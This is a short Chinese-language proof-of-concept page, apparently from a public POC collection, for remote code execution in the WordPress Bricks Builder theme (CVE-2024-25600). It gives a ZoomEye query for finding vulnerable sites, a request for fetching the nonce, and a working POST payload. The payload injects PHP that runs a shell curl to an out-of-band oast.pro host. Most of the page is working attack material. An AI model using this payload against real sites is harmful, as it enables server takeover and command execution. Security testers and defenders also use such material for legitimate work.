## WordPress插件Bricks Builder存在RCE漏洞(CVE-2024-25600)

## zoomeye
```
web.body="/wp-content/themes/bricks/"
```

## poc

### 获取nonce值
```
GET / HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:96.0) Gecko/20100101 Firefox/96.0
Connection: close
Accept-Encoding: gzip, deflate
```
![f8692e900e34adeb6f8b23677258b8e1](https://github.com/wy876/POC/assets/139549762/656552ce-28a6-407a-b746-56bd36ea3eb0)

### rce
```
POST /wp-json/bricks/v1/render_element HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: close
Content-Length: 401
Content-Type: application/json
Accept-Encoding: gzip, deflate

{
  "postId": "1",
  "nonce": "c5b5949**",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "ob_start();echo `curl cnc4ej5blq62an78ck6giyhcffmdr5t56.oast.pro`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
        "objectType": "post"
      }
    }
  }
}
```
![78880674cd49cefc6d5787c30efaf8cd](https://github.com/wy876/POC/assets/139549762/986bebf0-4369-462b-923c-775434318338)

## 漏洞分析
- https://xz.aliyun.com/t/13833
